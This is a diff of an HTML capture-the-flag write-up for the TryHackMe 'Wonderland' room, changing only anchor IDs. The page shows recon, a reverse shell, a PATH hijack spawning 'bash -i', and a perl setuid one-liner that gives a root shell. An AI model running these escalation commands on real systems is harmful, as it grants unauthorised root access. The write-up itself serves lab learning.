@@ -19,23 +19,23 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org06ecc85">Recon</a>
+<li><a href="#org21e17c6">Recon</a>
 <ul>
-<li><a href="#org3b61e19">Web Server</a></li>
+<li><a href="#orgff708bb">Web Server</a></li>
 </ul>
 </li>
-<li><a href="#orge2e7a2b">Alice</a></li>
-<li><a href="#org170323b">Hopping away</a></li>
-<li><a href="#org4b5a4d7">Hatter</a></li>
-<li><a href="#orgc53d7eb">Privilege Escalation through <code>suid</code> capability</a></li>
-<li><a href="#orgbea8490">Summing up</a></li>
+<li><a href="#org60f6451">Alice</a></li>
+<li><a href="#org97a281c">Hopping away</a></li>
+<li><a href="#orgebac515">Hatter</a></li>
+<li><a href="#orgbe41f5c">Privilege Escalation through <code>suid</code> capability</a></li>
+<li><a href="#orgd3a3853">Summing up</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org06ecc85" class="outline-2">
-<h2 id="org06ecc85"><a href="#org06ecc85">Recon</a></h2>
-<div class="outline-text-2" id="text-org06ecc85">
+<div id="outline-container-org21e17c6" class="outline-2">
+<h2 id="org21e17c6"><a href="#org21e17c6">Recon</a></h2>
+<div class="outline-text-2" id="text-org21e17c6">
 <p>
 The initial nmap scan gives us some starting info:
 </p>
@@ -59,9 +59,9 @@ Before moving on to the web-server analysis:
 </div>
 </div>
 
-<div id="outline-container-org3b61e19" class="outline-3">
-<h3 id="org3b61e19"><a href="#org3b61e19">Web Server</a></h3>
-<div class="outline-text-3" id="text-org3b61e19">
+<div id="outline-container-orgff708bb" class="outline-3">
+<h3 id="orgff708bb"><a href="#orgff708bb">Web Server</a></h3>
+<div class="outline-text-3" id="text-orgff708bb">
 <p>
 Just by visiting the website we notice that:
 </p>
@@ -103,22 +103,22 @@ Testing it and&#x2026;we have access as <code>alice</code>
 </div>
 </div>
 </div>
-<div id="outline-container-orge2e7a2b" class="outline-2">
-<h2 id="orge2e7a2b"><a href="#orge2e7a2b">Alice</a></h2>
-<div class="outline-text-2" id="text-orge2e7a2b">
+<div id="outline-container-org60f6451" class="outline-2">
+<h2 id="org60f6451"><a href="#org60f6451">Alice</a></h2>
+<div class="outline-text-2" id="text-org60f6451">
 <p>
 Strangely enough, good ol&rsquo; find does not give us the position of
 <code>user.txt</code>, hinting that we will have to login as a different user in
 order to get it.
 </p>
-<pre class="example" id="org42adf89">
+<pre class="example" id="orgc0d3d05">
 alice@wonderland:/$ find . -name user.txt 2&gt;/dev/null
 </pre>
 
 <p>
 The different users, as listed by <code>cat /etc/passwd</code>:
 </p>
-<pre class="example" id="org2438b31">
+<pre class="example" id="orgb46e228">
 root:x:0:0:root:/root:/bin/bash
 tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
 alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
@@ -131,7 +131,7 @@ rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
 <code>rabbit</code> (while being alice):
 </p>
 
-<pre class="example" id="org4efd9fb">
+<pre class="example" id="org4a6135e">
 User alice may run the following commands on wonderland:
     (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 </pre>
@@ -166,15 +166,15 @@ settling for a netcat one that got the job done
 </div>
 </div>
 
-<div id="outline-container-org170323b" class="outline-2">
-<h2 id="org170323b"><a href="#org170323b">Hopping away</a></h2>
-<div class="outline-text-2" id="text-org170323b">
+<div id="outline-container-org97a281c" class="outline-2">
+<h2 id="org97a281c"><a href="#org97a281c">Hopping away</a></h2>
+<div class="outline-text-2" id="text-org97a281c">
 <p>
 After receiving the reverse shell in my netcat listener, the interface
 was sadly unusable, so I had to <i>spice it up</i> with some simple python:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgd23537c">python3.6 -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span> <span class="org-comment-delimiter"># </span><span class="org-comment">python can not be found in the path</span>
+<pre class="src src-bash" id="org450f2f2">python3.6 -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span> <span class="org-comment-delimiter"># </span><span class="org-comment">python can not be found in the path</span>
 </pre>
 </div>
 
@@ -198,7 +198,7 @@ replacing it with a reverse shell  maybe or sh itself?
 The second option worked just fine with <code>bash -i</code>:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgf48cf3b"><span class="org-variable-name">PATH</span>=<span class="org-string">"/home/rabbit:$PATH"</span>
+<pre class="src src-bash" id="org24f5f02"><span class="org-variable-name">PATH</span>=<span class="org-string">"/home/rabbit:$PATH"</span>
 <span class="org-builtin">echo</span> <span class="org-string">'bash -i'</span> &gt; date
 ./teaParty
 </pre>
@@ -212,9 +212,9 @@ easily.
 </div>
 </div>
 
-<div id="outline-container-org4b5a4d7" class="outline-2">
-<h2 id="org4b5a4d7"><a href="#org4b5a4d7">Hatter</a></h2>
-<div class="outline-text-2" id="text-org4b5a4d7">
+<div id="outline-container-orgebac515" class="outline-2">
+<h2 id="orgebac515"><a href="#orgebac515">Hatter</a></h2>
+<div class="outline-text-2" id="text-orgebac515">
 <p>
 As <code>hatter</code> there is not much I can do. In fact, this is the part of the
 room where I got impressively stuck and could not figure out what to
@@ -258,9 +258,9 @@ it!
 </div>
 </div>
 
-<div id="outline-container-orgc53d7eb" class="outline-2">
-<h2 id="orgc53d7eb"><a href="#orgc53d7eb">Privilege Escalation through <code>suid</code> capability</a></h2>
-<div class="outline-text-2" id="text-orgc53d7eb">
+<div id="outline-container-orgbe41f5c" class="outline-2">
+<h2 id="orgbe41f5c"><a href="#orgbe41f5c">Privilege Escalation through <code>suid</code> capability</a></h2>
+<div class="outline-text-2" id="text-orgbe41f5c">
 <p>
 Hidden in <code>linpeas.sh</code> output, there is the fact that in the target
 machine <code>perl</code> has the capability to <code>setuid</code>. This effectively means that
@@ -274,7 +274,7 @@ disappoint.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orga857a88">/usr/bin/perl -e <span class="org-string">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
+<pre class="src src-bash" id="org7cf3532">/usr/bin/perl -e <span class="org-string">'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span>
 </pre>
 </div>
 
@@ -284,9 +284,9 @@ After that I just used <code>find</code>, to get both <code>root.txt</code> and 
 </div>
 </div>
 
-<div id="outline-container-orgbea8490" class="outline-2">
-<h2 id="orgbea8490"><a href="#orgbea8490">Summing up</a></h2>
-<div class="outline-text-2" id="text-orgbea8490">
+<div id="outline-container-orgd3a3853" class="outline-2">
+<h2 id="orgd3a3853"><a href="#orgd3a3853">Summing up</a></h2>
+<div class="outline-text-2" id="text-orgd3a3853">
 <p>
 I really liked how this room challenged me. It was not just at the
 last part, the python path hijack was a really nice technique as well!
